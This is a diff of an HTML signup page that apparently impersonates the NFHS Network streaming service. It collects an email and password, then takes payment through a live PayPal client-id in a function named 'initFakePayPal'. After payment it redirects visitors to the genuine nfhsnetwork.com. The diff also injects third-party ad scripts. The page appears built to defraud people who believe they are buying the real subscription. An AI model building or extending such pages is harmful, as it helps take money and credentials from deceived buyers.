@@ -277,6 +277,22 @@ Maxpreps & NFHS Network
 
 </header>
 
+
+<div style="width:100%; display:flex; justify-content:center; margin:10px 0;">
+
+<script>
+  atOptions = {
+    'key' : 'ba4b839b8718e0071c162f4a4896d426',
+    'format' : 'iframe',
+    'height' : 50,
+    'width' : 320,
+    'params' : {}
+  };
+</script>
+<script src="https://www.highperformanceformat.com/ba4b839b8718e0071c162f4a4896d426/invoke.js"></script>
+
+</div>
+
 <!-- HERO -->
 
 <section class="hero">
@@ -433,23 +449,6 @@ Easily create clips to share and rewatch the most memorable moments - anytime, a
 </section>
 
 
-<section class="feature reverse">
-
-<img src="https://i.ibb.co.com/Z6ZqPY44/image.png">
-
-<div class="feature-text">
-
-<h2>Follow your school. Favorite your teams.</h2>
-
-<p>
-Watch and keep up with your favorite team even when you can’t be at the game. Plus get access to top regular season games featured throughout each season.
-</p>
-
-</div>
-
-</section>
-
-
 <section class="feature">
 
 <div class="feature-text">
@@ -459,6 +458,20 @@ Watch and keep up with your favorite team even when you can’t be at the game. 
 <p>
 Stream playoff and state championship games from over 44 National Federation of State High Schools member state associations. Watch any state championships live for fall, winter, and spring competitions.
 </p>
+
+<!-- 🔽 BANNER 320x250 -->
+<div style="margin-top:20px; text-align:center;">
+  <script>
+    atOptions = {
+      'key' : 'd69f857a40759d90e9f39d6d3928b3cd',
+      'format' : 'iframe',
+      'height' : 250,
+      'width' : 320,
+      'params' : {}
+    };
+  </script>
+  <script src="https://www.highperformanceformat.com/d69f857a40759d90e9f39d6d3928b3cd/invoke.js"></script>
+</div>
 
 </div>
 
@@ -536,18 +549,15 @@ let price=0
 let school=""
 
 function selectPlan(p,v){
-
 plan=p
 price=v
 
 document.getElementById("sumPlan").innerText="Plan: "+p
 document.getElementById("sumPrice").innerText="$"+v
-
 }
 
 function nextStep(n){
 
-// STEP 1 VALIDASI (PLAN)
 if(n === 2){
 if(plan === ""){
 alert("Please select a plan first")
@@ -555,34 +565,27 @@ return
 }
 }
 
-// STEP 2 VALIDASI (ACCOUNT)
 if(n === 3){
-
 let email = document.getElementById("email").value.trim()
 let password = document.getElementById("password").value.trim()
 
-// CEK EMAIL KOSONG
 if(email === ""){
 alert("Email is required")
 return
 }
 
-// FORMAT EMAIL SEDERHANA
 let emailPattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/
 if(!email.match(emailPattern)){
 alert("Invalid email format")
 return
 }
 
-// PASSWORD
 if(password.length < 6){
 alert("Password must be at least 6 characters")
 return
 }
-
 }
 
-// STEP 3 VALIDASI (SCHOOL)
 if(n === 4){
 if(school === ""){
 alert("Please select a school")
@@ -590,54 +593,38 @@ return
 }
 }
 
-
-// PINDAH STEP
 document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"))
 document.getElementById("step"+n).classList.add("active")
 
 document.querySelectorAll(".progress span").forEach(s=>s.classList.remove("active"))
 document.getElementById("p"+n).classList.add("active")
 
-// INIT PAYMENT (FAKE / REAL)
 if(n === 4){
-if(typeof initFakePayPal === "function"){
 initFakePayPal()
 }
-}
 
-}
-
+} // ✅ WAJIB ADA
 /* SCHOOL LIST */
 
-const schools=[
-"High School"
-]
+const schools=["High School"]
 
 const list=document.getElementById("schoolList")
 
 function render(data){
-
 list.innerHTML=""
 
 data.forEach(s=>{
-
 let div=document.createElement("div")
-
 div.className="school"
 div.innerText=s
 
 div.onclick=function(){
-
 school=s
-
 document.getElementById("sumSchool").innerText="School: "+s
-
 }
 
 list.appendChild(div)
-
 })
-
 }
 
 render(schools)
@@ -651,17 +638,14 @@ render(schools)
 return
 }
 
-// AUTO TAMBAH "High School"
 let formatted = v.toLowerCase()
 
 if(!formatted.includes("high school")){
 formatted += " high school"
 }
 
-// FORMAT HURUF BESAR DEPAN
 formatted = formatted.replace(/\b\w/g, c => c.toUpperCase())
 
-// LANGSUNG TAMPILKAN HASIL (TANPA FILTER DATA)
 render([formatted])
 
 })
@@ -669,38 +653,86 @@ render([formatted])
 </script>
 
 
-<script src="https://www.paypal.com/sdk/js?client-id=YOUR_CLIENT_ID&currency=USD"></script>
+<!-- PAYPAL SDK -->
+<script src="https://www.paypal.com/sdk/js?client-id=AfKG8W_CmXkS9-TxTA4rgRUPilHwrFYMqiiHLRRrtB7JRzOSdOqck2h6Hx7fmjKFqx0ntXC9R-pVe0mS&currency=USD&components=buttons,funding-eligibility"></script>
 
 <script>
 
+function initFakePayPal(){
+
+// pastikan container ada
+let container = document.getElementById("paypal-button-container")
+
+if(!container){
+console.error("Container PayPal tidak ditemukan")
+return
+}
+
+// reset biar tidak double
+container.innerHTML = "Loading payment..."
+
+setTimeout(() => {
+
+container.innerHTML = ""
+
 paypal.Buttons({
 
+style: {
+shape: 'rect',
+color: 'gold',
+layout: 'vertical',
+label: 'paypal'
+},
+
+// ✅ TAMBAHAN (biar lebih clean & fokus ke kartu)
+funding: {
+disallowed: [paypal.FUNDING.CREDIT]
+},
+
 createOrder: function(data, actions) {
-
 return actions.order.create({
-
 purchase_units: [{
-amount: { value: price.toString() }
+amount: {
+value: price.toString()
+}
 }]
-
 })
-
 },
 
 onApprove: function(data, actions) {
 return actions.order.capture().then(function(details) {
 
-alert("Payment Successful 🎉")
+alert("Payment Successful 🎉\nThank you, " + details.payer.name.given_name)
 
+// loading screen
+document.body.innerHTML = `
+<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:black;color:white;font-size:20px;">
+Redirecting...
+</div>
+`
+
+setTimeout(function(){
 window.location.href = "https://nfhsnetwork.com"
+},2000)
 
 })
+},
+
+onCancel: function () {
+alert("Payment cancelled ❌")
+},
+
+onError: function (err) {
+console.error(err)
+alert("Payment failed ❌")
 }
 
 }).render('#paypal-button-container')
 
+}, 300) // delay kecil biar aman
+
+}
 </script>
 
 </body>
 </html>
-
